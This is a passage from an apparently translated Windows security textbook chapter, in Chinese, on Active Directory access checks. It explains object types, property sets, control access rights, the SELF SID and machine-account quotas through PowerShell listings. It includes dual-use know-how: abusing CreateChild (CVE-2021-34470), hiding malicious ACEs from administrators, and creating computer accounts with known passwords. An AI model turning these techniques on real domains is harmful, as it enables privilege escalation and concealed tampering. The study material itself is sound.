Self  允许写入属性值（服务器将验证该值）

ReadProp  允许读取属性值

WriteProp  允许写入属性值

DeleteTree  允许删除对象树

ListObject  允许列出特定对象

ControlAccess  授予对目录操作的访问权限

其中一些访问权限比其他权限需要更多的解释。在以下各节中，我们将逐步介绍它们所代表的各种操作，以及如何使用它们来确定用户在目录服务器上可以执行的操作。请注意，这些访问权限的行为也适用于在对象的 SACL 中指定的 ACE，这意味着您应该能够将此处提供的描述应用于审计事件的生成。

#### 创建对象

如果用户获得 CreateChild 访问权限，他们可以为该对象创建子对象。对象的 AllowedObject ACE 决定了用户可以创建哪些类型的子对象。代码清单 11-24 展示了如何为特定对象类型授予 CreateChild 访问权限。




```
PS> $sd = New-NtSecurityDescriptor -Type DirectoryService -Owner "SY"
-Group "SY"
❶ PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type Allowed
-Access List
❷ PS> $user = Get-DsSchemaClass -Name "user"
PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type AllowedObject
-Access CreateChild -ObjectType $user.SchemaId
PS> Format-NtSecurityDescriptor $sd -Summary -SecurityInformation Dacl
-ResolveObjectType
<DACL>
Everyone: (Allowed)(None)(List)
Everyone: (AllowedObject)(None)(CreateChild)(OBJ:User)

❸ PS> Get-NtGrantedAccess $sd -ObjectType $user
CreateChild, List

❹ PS> $cont = Get-DsSchemaClass -Name "container"
PS> Get-NtGrantedAccess $sd -ObjectType $cont
List
```


*代码清单 11-24：测试 CreateChild 对象类型访问*

我们首先创建一个新的安全描述符，并添加一个授予所有人 List 访问权限的 ACE ❶。此 ACE 未指定对象类型，因此它将适用于匹配该 SID 的每个用户。接下来，我们获取用户模式类 ❷，并使用它创建第二个 ACE，该 ACE 授予 CreateChild 访问权限，并将模式标识符指定为对象类型。

我们显示安全描述符以验证我们已创建了正确的 ACE，将 ResolveObjectType 参数传递给 Format-NtSecurityDescriptor 以返回目录对象类型的名称。如果您不使用此参数，命令将打印 GUID，这不太有用；但是请注意，返回这些名称可能非常耗时，并可能导致命令挂起。

我们现在请求安全描述符的最大授予访问权限 ❸，将要检查的对象类型指定为模式类，并获得了 CreateChild 和 List 访问权限。目录服务器在执行子创建操作的访问检查时也会这样做；它将查找正在创建的对象类的模式类标识符，并将其传递给访问检查 API。如果授予了 CreateChild 访问权限，操作将继续进行。

最后，我们重复访问检查，但这次指定容器类 ❹。这次，我们仅获得 List 访问权限——因为我们在要检查的对象类型列表中没有传递用户类的标识符，访问检查忽略了 CreateChild ACE。

如果对象的安全描述符包含一个 ACE，该 ACE 授予 CreateChild 访问权限且未指定对象类型，则用户可以创建任何子对象。然而，仍然存在限制。首先，用户只能创建结构类的新对象；服务器应拒绝从抽象类或辅助类创建对象。其次，每个模式类都有一个可能的父类列表，即 *superiors*，存储在 possSuperiors 和 systemPossSuperiors 属性中。仅当父对象的类在此类列表中时，服务器才允许创建子对象。

由于类继承的规则，确定所有允许的子类可能相当复杂。幸运的是，目录服务器还构造了 possibleInferiors 属性，该属性列出了目录允许作为给定模式类的子类的类。您可以使用 Get-DsSchemaClass PowerShell 命令并带有 Inferior 参数来查询这些类，如 代码清单 11-25 所示。




```
PS> Get-DsSchemaClass "user" -Inferior
Name                          SchemaId                             Attributes
----                          --------                             ----------
ms-net-ieee-80211-GroupPolicy 1cb81863-b822-4379-9ea2-5ff7bdc6386d 3
nTFRSSubscriptions            2a132587-9373-11d1-aebc-0000f80367c1 3
classStore                    bf967a84-0de6-11d0-a285-00aa003049e2 4
ms-net-ieee-8023-GroupPolicy  99a03a6a-ab19-4446-9350-0cb878ed2d9b 3
```


*代码清单 11-25：列出用户模式类的下级类*

代码清单 11-25 显示了用户对象允许的四个子类。尝试创建不在子类列表中的类的对象将导致错误并中止创建操作。管理员可以通过将用户类添加到另一个类的 possSuperiors 属性来更改此列表。

滥用子类

如果用户获得 CreateChild 访问权限，则存在他们可能在预期范围之外配置目录的风险。您应假设授予创建子对象的权限意味着用户可以设置新对象中的任何属性，其中一些属性可能会影响服务器或第三方应用程序做出的安全决策。用户还可以创建具有允许的较低类别的新对象。

创建较低类别对象的能力何时会导致问题？举个例子，我在安装 Exchange 邮件服务器时发现 Active Directory 服务器中添加了一个类，普通用户可以在目录中的现有对象中创建该类。该类又将容器类作为其较低类别，而容器类可能包含安全关键类，如用户或组。请查阅 CVE-2021-34470 以了解此问题的详细信息。

您可以将一个 Get-DsSchemaClass 命令的输出通过管道传递给另一个命令，以构建从父类派生的子类的完整列表：


```
PS> Get-DsSchemaClass user -Inferior | Get-DsSchemaClass -Inferior
```


这将显示如果您拥有 CreateChild 访问权限，您可以创建哪些对象类型。重复此管道操作，直到输出中不再出现新的类。

#### 删除对象

三个访问权限控制删除操作：Delete、DeleteChild 和 DeleteTree。每个权限对应不同的删除操作。Delete 访问权限仅适用于当前对象；如果对象具有子对象，服务器将拒绝删除该对象。（如果用户拥有必要的访问权限，客户端应用程序可以通过递归枚举所有子对象并删除它们来绕过此限制。）

如果用户获得 DeleteChild 访问权限，他们可以删除任何直接子对象，但如果该子对象自身具有子对象，则适用与 Delete 相同的限制。授予 DeleteChild 访问权限的 ACE 可以使用对象类型来限制用户可以删除对象的哪些类。

最后，DeleteTree 访问权限允许用户删除整个对象树，包括根对象。此删除操作完全在服务器端执行，使用特定的树删除命令。如果用户拥有此权限，则无需对子对象拥有任何删除权限。

您可以使用 Remove-ADObject PowerShell 命令删除对象。要使用 DeleteTree 访问权限，必须指定 Recursive 参数。

#### 列出对象

访问权限列表包括两个用于列出对象的权限：List 和 ListObject。这两者之间存在一些差异。默认情况下，如果用户未获得 List 访问权限，则无法检查对象的任何子对象。但是，此限制不具有传递性；例如，如果子对象授予 List 访问权限，则用户可以检查该对象的子对象，即使他们无法从父对象列出该对象本身。（这意味着用户需要知道子对象的名称才能进行检查。）

ListObject 访问权限不适用于父对象，而是适用于单个对象。如果用户对某个对象拥有 ListObject 访问权限，但对父对象没有 List 访问权限，则用户仍然可以列出该对象并与其交互。默认情况下，Active Directory 服务器不检查 ListObject 访问权限，这可能是出于性能原因。

如果用户未获得对象的 List 访问权限，但尝试枚举其子对象，服务器需要对每个子对象执行访问检查，以确定哪些对象通过允许 ListObject 访问权限而可见。对于具有大量子对象的目录对象，这将是非常昂贵的操作。

您可以使用目录中 dsHeuristics 属性中的标志来启用此访问权限。使用 Get-DsHeuristics PowerShell 命令查询该标志：


```
PS> (Get-DsHeuristics).DoListObject
```


如果输出为 True，则 ListObject 访问权限已启用。

#### 读取和写入属性

ReadProp 和 WriteProp 访问权限分别控制对象中属性的读取和写入。可以通过不带对象类型的 ACE 允许读取和写入对象的所有属性。然而，更常见的是，对象允许读取所有属性，但通过将 ACE 的对象类型指定为属性的架构标识符来限制可以写入哪些属性。

代码清单 11-26 展示了如何实现读取和写入属性的访问检查示例。




```
❶ PS> $sd = New-NtSecurityDescriptor -Type DirectoryService -Owner "DA"
-Group "DA"
PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type Allowed
-Access ReadProp
❷ PS> $attr = Get-DsSchemaAttribute -Name "accountExpires"
PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type AllowedObject
-Access WriteProp -ObjectType $attr.SchemaId
❸ PS> Get-NtGrantedAccess $sd -ObjectType $attr
ReadProp, WriteProp

❹ PS> $pwd = Get-DsSchemaAttribute -Name "pwdLastSet"
PS> Get-NtGrantedAccess $sd -ObjectType $pwd
ReadProp
```


*代码清单 11-26：测试 ReadProp 和 WriteProp 访问权限*

我们首先创建一个新的安全描述符，其中包含一个授予 ReadProp 访问权限的 Allowed ACE，而不指定对象类型 ❶。然后，我们添加一个 ACE，仅授予对 accountExpires 属性的 WriteProp 访问权限 ❷。

接下来，我们执行一次访问检查，将属性的架构标识符指定为对象类型❸，结果获得了ReadProp和WriteProp两种访问权限。然而，如果我们使用不同的属性类型❹运行访问检查，则仅获得通用的ReadProp访问权限。

请注意，安全描述符中可能包含拒绝（Denied）ACE，以阻止对特定属性的读取或写入，即使另一个ACE允许对所有属性的读取或写入。例如，如果拒绝ACE阻止了此处查询的pwdLastSet属性的读取，那么即使ReadProp访问权限也不会获得。目录服务器必须确保为要检查的属性指定精确的对象类型。

> 注意
>
> *即使访问检查表明某个属性可以被读取或写入，目录服务器也不一定必须遵循该决定。目录中包含几个普通用户无法读取或写入的属性。例如，他们无法读取或写入用户密码，这些密码存储在仅系统有权访问的unicodePwd属性中。无论怎样配置安全描述符，都不应改变此行为（尽管存在一种单独的机制允许用户写入密码；我们将在稍后的“控制访问权限”一节中回到这一点）。另请注意，普通用户无法修改任何标记为仅系统（system-only）的属性，这由架构中的systemOnly属性指示。*

#### 检查多个属性

为了避免您向目录服务器发送多个请求，LDAP支持在单个请求中读取和写入多个属性。然而，如果在确定您可以读取或写入什么之前，要求对每个属性的架构标识符进行访问检查，代价会很高。

正如我在第7章中所述，访问检查过程允许您构建一个对象类型树，以便在单次检查中验证多个属性。该树列出每个对象类型及其将获得的访问权限，使目录服务器能够快速确定是否应批准请求。代码清单 11-27展示了如何在访问检查中使用对象类型树。它扩展了代码清单 11-26中的命令。




```
❶ PS> $user = Get-DsSchemaClass -Name "user"
PS> $obj_tree = New-ObjectTypeTree $user
PS> Add-ObjectTypeTree -Tree $obj_tree $attr
PS> Add-ObjectTypeTree -Tree $obj_tree $pwd

❷ PS> Get-NtGrantedAccess $sd -ObjectType $obj_tree -ResultList -PassResult |
Format-Table Status, SpecificGrantedAccess, Name
        Status SpecificGrantedAccess Name
        ------ --------------------- ----
STATUS_SUCCESS              ReadProp user
STATUS_SUCCESS   ReadProp, WriteProp accountExpires
STATUS_SUCCESS              ReadProp pwdLastSet

❸ PS> Get-NtGrantedAccess $sd -ObjectType $obj_tree -ResultList -PassResult
-Access WriteProp | Format-Table Status, SpecificGrantedAccess, Name
              Status SpecificGrantedAccess Name
              ------ --------------------- ----
STATUS_ACCESS_DENIED                  None user
      STATUS_SUCCESS             WriteProp accountExpires
STATUS_ACCESS_DENIED                  None pwdLastSet
```


*代码清单 11-27：使用对象类型树检查多个属性*

我们首先获取用户架构类❶，并使用它构建树，将类的架构标识符设置为树的根。然后，我们使用Add-ObjectTypeTree命令将我们要检查的两个属性accountExpires和pwdLastSet作为叶节点添加到根节点。图11-4显示了最终树的结构。



![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure11-4.webp)

图11-4：用户对象及其accountExpires和pwdLastSet属性的对象类型树

接下来，我们将树传递给Get-NtGrantedAccess❷，确保指定要获取所有结果的列表，而不是单个授予的访问值。结果显示，只有accountExpires属性获得了ReadProp和WriteProp访问权限，而用户对象和pwdLastSet属性仅获得了ReadProp访问权限。

通常，Active Directory服务器会指定要检查的显式访问权限，而不是简单地请求最大授予的访问权限。我们可以通过将Access参数设置为WriteProp并检查结果行为来测试这一点❸。结果显示，用户对象及其pwdLastSet属性被拒绝访问，但accountExpires属性获得了WriteProp访问权限。

对象类在树中被指定这一事实导致了一个有趣的行为，如代码清单 11-28所示。




```
PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type AllowedObject
-Access WriteProp -ObjectType $user.SchemaId
PS> Get-NtGrantedAccess $sd -ObjectType $obj_tree -ResultList -PassResult |
Format-Table Status, SpecificGrantedAccess, Name
        Status SpecificGrantedAccess Name
        ------ --------------------- ----
STATUS_SUCCESS   ReadProp, WriteProp user
STATUS_SUCCESS   ReadProp, WriteProp accountExpires
STATUS_SUCCESS   ReadProp, WriteProp pwdLastSet
```


*代码清单 11-28：向架构类授予WriteProp访问权限*

如您所见，可以添加一个ACE，为指定对象类的所有属性授予访问权限。在这里，我们添加了一个授予WriteProp访问权限的ACE，并指定了用户类的架构标识符。当我们重复访问检查时，这次发现树中的所有属性都获得了WriteProp访问权限。

这种行为——授予对所有属性的访问权限——很可能是实现过程中涌现出的特性，而非有意为之的设计决策；Windows 用于修改目录对象安全描述符的用户界面无法理解该 ACE，并将其显示为不授予任何特定访问权限。攻击者可能利用此行为向管理员隐藏对安全描述符的恶意修改。

#### 分析属性集

如 代码清单 11-29 所示，一个对象类可以拥有许多属性——以用户类为例，如果包括其所有辅助类的属性，总计可达 428 个。

```
PS> (Get-DsSchemaClass user -Recurse -IncludeAuxiliary |
Sort-Object SchemaId -Unique |
Select-Object -ExpandProperty Attributes).Count
428
```

*代码清单 11-29：统计用户模式类别的属性数量*

如果您想为所有这些属性授予特定的访问权限，DACL 将迅速变得难以管理；ACL 甚至可能超出其允许的 64KB 空间限制。

为了部分解决此问题，Active Directory 配置可以定义任意的*属性集*，将多个属性分组到一个 GUID 下。然后，它可以在 ACE 中使用此标识符作为对象类型，一次性授予或拒绝一组属性的访问权限。属性集只是*扩展权限*的一种类型，它允许管理员向目录添加额外的访问权限。我们将在后续章节中介绍另外两种：控制访问权限和验证写入访问权限。代码清单 11-30 展示了如何获取当前目录中的所有扩展权限。

```
PS> $config_dn = (Get-ADRootDSE).configurationNamingContext
PS> $extended_dn = "CN=Extended-Rights,$config_dn"
PS> Get-ADObject -SearchBase $extended_dn -SearchScope OneLevel -Filter *
-Properties * | Group-Object {
   Get-NtAccessMask $_.validAccesses -AsSpecificAccess DirectoryService
}
Count Name                      Group
----- ----                      -----
   60 ControlAccess             {CN=Add-GUID,CN=Extended-Rights,...}
   15 ReadProp, WriteProp       {CN=DNS-Host-Name-Attributes,...}
    6 Self                      {CN=DS-Validated-Write-Computer,...}
```

*代码清单 11-30：获取扩展权限并按 validAccesses 属性分组*

对象可以在其 `validAccesses` 属性中指定特定类型的扩展权限，该属性存储一个表示目录对象访问权限的整数。我们使用 `Get-NtAccessMask` PowerShell 命令将该属性转换为访问权限枚举。如果 `validAccesses` 属性（以及 Name 列中的值）设置为 `ReadProp` 和 `WriteProp`，则该扩展权限是一个属性集。

为了简化对扩展权限和属性集的分析，NtObjectManager 模块实现了 `Get-DsExtendedRight` PowerShell 命令，如 代码清单 11-31 所示。

```
❶ PS> $attr = Get-DsSchemaAttribute -Name "accountExpires"
PS> $prop_set = Get-DsExtendedRight -Attribute $attr
PS> $prop_set
Name                             RightsId
----                      --------
❷ User-Account-Restrictions 4c164200-20c0-11d0-a768-00aa006e0529

❸ PS> $prop_set.AppliesTo  | Select-Object Name
Name
----
msDS-GroupManagedServiceAccount
inetOrgPerson
msDS-ManagedServiceAccount
computer
user

❹ PS> $user = Get-DsSchemaClass user
PS> Get-DsExtendedRight -SchemaClass $user
Name                           RightsId
----                           --------
Allowed-To-Authenticate        68b1d179-0d15-4d4f-ab71-46152e79a7bc
Email-Information              e45795b2-9455-11d1-aebd-0000f80367c1
General-Information            59ba2f42-79a2-11d0-9020-00c04fc2d3cf
--snip--
```

*代码清单 11-31：获取属性的属性集及其可能的模式类别*

我们首先获取之前使用的 `accountExpires` 属性，并将其传递给 `Get-DsExtendedRight` 命令 ❶。如果该属性属于某个属性集，命令将返回扩展权限。此处，输出将该属性列为 `User-Account-Restrictions` 属性集的一部分 ❷。

`RightsId` 列提供了在 ACE 中用于允许或拒绝对象类型访问的 GUID。您可以在模式属性的 `attributeSecurityGUID` 属性中找到此 GUID。每个属性集还有一个允许包含它的模式类别列表 ❸。这使目录服务器能够知道在执行访问检查时需要构建的对象类型树。

最后，我们执行反向操作；查找适用于特定模式类别（用户）的所有属性集 ❹。

代码清单 11-32 演示了在访问检查中使用属性集。

```
❶ PS> $sd = New-NtSecurityDescriptor -Type DirectoryService
-Owner "SY" -Group "SY"
PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type AllowedObject
-Access ReadProp -ObjectType $prop_set.RightsId
❷ PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type AllowedObject
-Access WriteProp -ObjectType $attr.SchemaId
❸ PS> $obj_tree = New-ObjectTypeTree -SchemaObject $user
PS> Add-ObjectTypeTree -Tree $obj_tree -SchemaObject $prop_set
❹ PS> Get-NtGrantedAccess $sd -ObjectType $prop_set -ResultList -PassResult |
Format-Table SpecificGrantedAccess, Name
SpecificGrantedAccess Name
--------------------- ----
             ReadProp user
             ReadProp User-Account-Restrictions
  ReadProp, WriteProp accountExpires
             ReadProp msDS-AllowedToActOnBehalfOfOtherIdentity
             ReadProp msDS-User-Account-Control-Computed
             ReadProp msDS-UserPasswordExpiryTimeComputed
             ReadProp pwdLastSet
             ReadProp userAccountControl
             ReadProp userParameters
```

*代码清单 11-32：使用属性集执行访问检查*

我们构建一个新的安全描述符来执行检查 ❶，并基于属性集标识符授予 `ReadProp` 访问权限。我们还使用 代码清单 11-31 中定义的 `attr` 变量，授予该集合内 `accountExpires` 属性的 `WriteProp` 访问权限 ❷。

接下来，我们需要构建对象类型树 ❸。与之前一样，树的根是对象类。然后，我们将属性集添加为树的子节点，生成如图 图 11-5 所示的对象类型树。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure11-5.webp)

图 11-5: 属性集对象类型树

此对象类型树包含第 1 层的属性集以及第 2 层集合中每个属性的条目。这种树结构允许我们基于属性集标识符或单个属性授予访问权限。

请注意，目录服务器对单个属性的检查方式略有不同；它总是尽可能使用属性集，但如果某个属性不在属性集中，它会使用一个名为 `PROPSET_GUID_DEFAULT` 的虚拟 GUID 作为占位符。您可能会在审计日志条目中看到这个 GUID，尽管配置的扩展权限并未指定它。

我们将对象类型树和安全描述符传递给访问检查 ❹，由于我们授予了属性集 `ReadProp` 访问权限，集合中的所有属性至少获得此级别的访问权限。因为我们明确授予了 `accountExpires` 属性 `WriteProp` 访问权限，它也会获得此访问权限。

如您所见，如果安全描述符授予了集合中每个属性 `WriteProp` 访问权限，该访问权限会传播到级别 1 的属性集节点。因此，如果服务器仅检查属性集的已授予访问权限，那么无论安全描述符是直接使用属性集标识符授予访问权限，还是授予集合中每个单独属性的访问权限，结果都无关紧要。

最后要强调的一点是，当我们为属性集中的属性添加拒绝 ACE 时会发生什么。代码清单 11-33 显示了一个示例。




```
❶ PS> $pwd = Get-DsSchemaAttribute -Name "pwdLastSet"
PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type DeniedObject
-Access ReadProp -ObjectType $pwd.SchemaId
❷ PS> Edit-NtSecurityDescriptor $sd -CanonicalizeDacl
PS> Get-NtGrantedAccess $sd -ObjectType $obj_tree -ResultList -PassResult |
Format-Table SpecificGrantedAccess, Name
SpecificGrantedAccess Name
--------------------- ----
               ❸ None user
                 None User-Account-Restrictions
  ReadProp, WriteProp accountExpires
             ReadProp msDS-AllowedToActOnBehalfOfOtherIdentity
             ReadProp msDS-User-Account-Control-Computed
             ReadProp msDS-UserPasswordExpiryTimeComputed
                 None pwdLastSet
             ReadProp userAccountControl
             ReadProp userParameters
```


*代码清单 11-33：拒绝属性集中某个属性的访问权限*

在此列表中，我们为 `pwdLastSet` 属性包含了一个拒绝 ACE，以限制 `ReadProp` 访问权限 ❶。添加 ACE 后，您必须记得对 DACL 进行规范化 ❷；否则，它不会出现在列表开头，访问检查过程将忽略它。

当我们运行访问检查时，可以看到拒绝 ACE 已从 `pwdLastSet` 属性中移除了 `ReadProp` 访问权限，然后将该更改传播到属性集和用户类，也移除了它们的访问权限 ❸。集合中的所有其他属性保留其 `ReadProp` 访问权限。这种行为是合理的：如果属性集中的某个属性被拒绝访问，那么整个属性集就不会获得 `ReadProp` 访问权限。

如果使用属性集标识符用于拒绝对象 ACE，则集合中的所有属性都将失败 `ReadProp` 访问权限。但是，`accountExpires` 仍会获得 `WriteProp` 访问权限，因为它有一个单独的 ACE 授予该权限。

Active Directory 服务器管理员可以向配置中添加自己的属性集，以将此功能扩展到常用属性；这降低了对象安全描述符的复杂性。

#### 检查控制访问权限

第二种类型的扩展权限，*控制访问权限*，不一定对应于任何对象属性；相反，它们告诉 Active Directory 服务器用户是否可以执行特定操作。让我们先列出部分控制访问权限，如 代码清单 11-34 所示。




```
PS> Get-DsExtendedRight | Where-Object {
    $_.IsControl -and $_.Name -match "password"
} | Select-Object Name, RightsId
Name                               RightsId
----                               --------
User-Force-Change-Password         00299570-246d-11d0-a768-00aa006e0529
Unexpire-Password                  ccc2dc7d-a6ad-4a7a-8846-c04e3cc53501
Update-Password-Not-Required-Bit   280f369c-67c7-438e-ae98-1d46f3c6f541
User-Change-Password               ab721a53-1e2f-11d0-9819-00aa0040529b
```


*代码清单 11-34：列出名称中包含 password 的控制访问权限*

使用 `IsControl` 属性，我们过滤输出，使其仅包含名称中包含 password 的控制访问权限。如果扩展权限上的 `validAccesses` 属性设置为 `ControlAccess`，则 `IsControl` 属性为 true。结果包括两个常用的控制访问权限：`User-Change-Password` 和 `User-Force-Change-Password`，它们允许用户修改其用户对象的 `unicodePwd` 只写属性。我们无法使用 `WriteProp` 访问权限授予此能力。

这两个权限之间的区别在于，`User-Change-Password` 要求用户在修改操作中发送其旧密码，而 `User-Force-Change-Password` 则无需旧密码即可工作。这些对应于我们在 第 10 章 中讨论的 SAM 用户访问权限 `ChangePassword` 和 `ForcePasswordChange`，并具有相同的目的。

为了举例说明目录服务器如何检查控制访问权限，假设用户想要更改另一个用户的密码。代码清单 11-35 显示了服务器如何实现允许更改操作的访问检查。




```
❶ PS> $sd = New-NtSecurityDescriptor -Type DirectoryService -Owner "SY" 
-Group "SY"
PS> $right = Get-DsExtendedRight -Name 'User-Change-Password'
PS> Add-NtSecurityDescriptorAce $sd -KnownSid World -Type AllowedObject
-Access ControlAccess -ObjectType $right.RightsId
❷ PS> $user = Get-DsSchemaClass user
PS> $obj_tree = New-ObjectTypeTree -SchemaObject $user
PS> Add-ObjectTypeTree -Tree $obj_tree -SchemaObject $right
❸ PS> $force = Get-DsExtendedRight -Name 'User-Force-Change-Password'
PS> Add-ObjectTypeTree -Tree $obj_tree -SchemaObject $force
❹ PS> Get-NtGrantedAccess $sd -ObjectType $obj_tree -ResultList -PassResult |
Format-Table Status, SpecificGrantedAccess, Name
              Status SpecificGrantedAccess Name
              ------ --------------------- ----
STATUS_ACCESS_DENIED                  None user
      STATUS_SUCCESS         ControlAccess User-Change-Password
STATUS_ACCESS_DENIED                  None User-Force-Change-Password
```


*代码清单 11-35：检查 User-Change-Password 控制访问权限*

首先，我们创建一个新的安全描述符，获取控制访问权限，并向安全描述符中添加一个ACE，授予User-Change-Password控制访问权限❶。接下来，我们查询用户模式类，并使用它构建对象类型树❷。我们需要对象类作为根节点，但将控制访问权限作为其直接子节点。我们还会查询User-Force-Change-Password控制访问权限，并将其添加到树中❸。如果用户获得此权限，服务器将允许他们强制更改密码，即使他们无法提供当前设置的密码。

然后，我们执行访问检查❹，并看到用户已获得User-Change-Password控制访问权限的ControlAccess权限。现在，目录服务器可以继续执行该操作。

与其他类型的访问一样，安全描述符可以通过非对象ACE或在对象类上授予ControlAccess权限。从访问检查的角度来看，ControlAccess获得控制访问权限；目录服务器不一定知道其中的区别。管理员也可以扩展控制访问权限列表，尽管这通常需要第三方应用程序来检查该权限，因为目录服务器不会知道它。

#### 分析写入验证访问权限

最后一种扩展权限类型是写入验证访问权限。当`validAccesses`属性设置为`Self`时，它们被定义。代码清单 11-36展示了如何通过过滤`IsValidatedWrite`属性来列出写入验证访问权限。




```
PS> Get-DsExtendedRight | Where-Object IsValidatedWrite
Name                                     RightsId
----                                     --------
Validated-MS-DS-Behavior-Version         d31a8757-2447-4545-8081-3bb610cacbf2
Self-Membership                          bf9679c0-0de6-11d0-a285-00aa003049e2
Validated-MS-DS-Additional-DNS-Host-Name 80863791-dbe9-4eb8-837e-7f0ab55d9ac7
Validated-SPN                            f3a64788-5306-11d1-a9c5-0000f80367c1
DS-Validated-Write-Computer              9b026da6-0d3c-465c-8bee-5199d7165cba
```


*代码清单 11-36：列出写入验证访问权限*

写入验证访问权限授予用户写入对象特定属性的能力，服务器在写入前验证属性的新值。例如，如果用户想要向组对象添加新成员，他们需要对`member`属性具有WriteProp访问权限，该属性包含该组所有成员用户和组的可分辨名称列表。获得WriteProp访问权限将允许用户修改成员列表，添加或删除用户或组对象。然而，没有该访问权限的用户可能仍然能够添加或删除自己的用户账户名，如果他们获得组对象上Self-Membership写入验证访问权限的Self访问权限。虽然此操作仍会修改`member`属性，但服务器会确保添加或删除的值对应于调用用户的可分辨名称，并拒绝任何其他修改。

访问权限的名称`Self`可能源于其作为自我组成员资格机制的使用。随着时间的推移，其用途已扩展到涵盖一些其他属性。微软的Active Directory技术规范（*MS-ADTS*，可在线获取）将其称为`RIGHT_DS_WRITE_PROPERTY_EXTENDED`，这是一个稍微更好的描述。

我们不会为写入验证访问权限执行示例访问检查，因为它与代码清单 11-35中针对控制访问权限的检查相同；只需更改查询的扩展权限，并检查是否授予了Self访问权限。与ControlAccess一样，非对象ACE也可能授予Self访问权限，而无需针对写入验证访问权限的特定ACE。

请注意，管理员无法修改写入验证访问权限列表；这是因为目录服务器不知道如何强制执行该限制。第三方应用程序也无法实现此行为，因为其目的是限制可以对目录进行的更改。

#### 访问SELF SID

在第7章中讨论对象类型访问检查时，我还提到了一个主体SID，您可以在ACE中指定它来替换*SELF* SID。Active Directory使用*SELF* SID根据请求用户是否为“自我”来授予资源访问权限。它从对象的`objectSID`属性中提取用作此主体SID的SID，该属性用于存储用户或计算机账户的SID以及组SID。

例如，如果你想修改目录中的用户对象，服务器会查找该对象的安全描述符，并查询对象的`objectSID`属性。如果该属性存在于对象中，访问检查将使用该值作为主体SID，并结合安全描述符进行验证。如果属性不存在，则不会设置主体SID，任何带有`*SELF*` SID的ACE都不会被评估。代码清单 11-37展示了如何提取`objectSID`属性。

```
PS> $computer = Get-ADComputer -Identity $env:COMPUTERNAME
PS> $computer.SID.ToString()
S-1-5-21-1195776225-522706947-2538775957-1104

PS> Get-DsObjectSid -DistinguishedName $computer.DistinguishedName
Name              Sid
----              ---
MINERAL\GRAPHITE$ S-1-5-21-1195776225-522706947-2538775957-1104
```

*代码清单 11-37：获取计算机账户的objectSID*

访问该属性有多种方式。最简单的方法是使用`Get-ADComputer`、`Get-ADUser`或`Get-ADGroup`命令，这些命令会自动提取SID。在代码清单 11-37中，我们获取了当前计算机的SID。或者，如果你使用`Get-ADObject`，可以请求`objectSID`属性直接访问该属性。

你还可以使用NtObjectManager模块自带的命令：`Get-DsObjectSid`，该命令需要查询对象的完整可分辨名称。此命令的主要优势在于它返回一个`Sid`类，你可以直接在访问检查中使用，无需将值转换为正确格式。你可以将返回的SID传递给`Get-NtGrantedAccess`的`Principal`参数。我们将在本章末尾的示例中使用它。

#### 执行额外的安全检查

在大多数情况下，访问检查过程基于分配给对象的安全描述符授予对目录的访问权限，但也有几个例外。例如，目录支持`SeRestorePrivilege`和`SeTakeOwnershipPrivilege`等特权，用于更改安全描述符的组件。让我们讨论一些额外的非标准检查。

##### 将工作站添加到域

在默认域配置中，*Authenticated Users*组在域控制器上获得一个特殊特权，称为`SeMachineAccountPrivilege`。该特权允许任何域用户将计算机加入域，这在底层意味着创建计算机对象。

当用户尝试创建计算机对象时，目录服务器会检查调用者是否对目标对象具有`CreateChild`访问权限。如果没有，它会检查调用者是否具有`SeMachineAccountPrivilege`特权。如果具有，则允许创建操作。

然而，在后一种情况下，服务器限制了用户在创建时可以设置的属性。例如，`SeMachineAccountPrivilege`特权不允许用户设置任意的`NtSecurityDescriptor`属性；对象必须使用默认的安全描述符。用户允许设置的属性值（如用户名）也必须符合固定模式，并且安全描述符必须使用*Domain Admins* SID作为其所有者和组SID，从而限制用户在对象创建后对其的访问。

单个用户只能创建固定数量的计算机账户。默认情况下，目录根部的`ms-DS-MachineAccountQuota`属性将此限制设置为10。为了在创建新计算机对象时强制执行此限制，服务器会搜索所有现有的计算机对象，并检查它们的`mS-DS-CreatorSID`属性，该属性存储了创建对象的用户的SID。然后服务器计算调用者已添加的计算机数量，如果超过配额，则拒绝请求。但是，如果调用者具有`CreateChild`访问权限，则配额不适用。代码清单 11-38展示了如何查询这些值。

```
PS> $root_dn = (Get-ADRootDSE).defaultNamingContext
PS> $obj = Get-ADObject $root_dn -Properties 'ms-DS-MachineAccountQuota'
PS> $obj['ms-DS-MachineAccountQuota']
10

PS> Get-ADComputer -Filter * -Properties 'mS-DS-CreatorSID' | ForEach-Object {
    $creator = $_['mS-DS-CreatorSID']
    if ($creator.Count -gt 0) {
        $sid = Get-NtSid -Sddl $creator[0]
        Write-Host $_.Name, " - ", $sid.Name
    }
}
GRAPHITE - MINERAL\alice
TOPAZ - MINERAL\alice
PYRITE - MINERAL\bob
```

*代码清单 11-38：查询用于强制执行计算机账户创建配额的SID*

你可以使用`New-ADComputer`命令创建新的计算机账户，并指定所需属性。例如，代码清单 11-39创建了具有已知密码的计算机账户*DEMOCOMP*。

```
PS> $pwd = ConvertTo-SecureString -String "Passw0rd1!!!" -AsPlainText -Force
PS> $name = "DEMOCOMP"
PS> $dnsname = "$name.$((Get-ADDomain).DNSRoot)"
PS> New-ADComputer -Name $name -SAMAccountName "$name`$" -DNSHostName $dnsname
-ServicePrincipalNames "HOST/$name" -AccountPassword $pwd -Enabled $true
```

*代码清单 11-39：在域中创建新的计算机账户*

你还可以使用SAM远程服务创建账户，如代码清单 11-40所示。

```
PS> $sam = Connect-SamServer -ServerName PRIMARYDC
PS> $domain = Get-SamDomain -Server $sam -User
PS> $user = New-SamUser -Domain $domain -Name 'DEMOCOMP$' -AccountType 
Workstation
PS> $pwd = ConvertTo-SecureString -String "Passw0rd1!!!" -AsPlainText -Force
PS> $user.SetPassword($pwd, $false)
```

*代码清单 11-40：通过SAM远程服务在域中创建新计算机*

服务器通常在将计算机加入域时以这种方式创建账户。

##### 用户委派权限

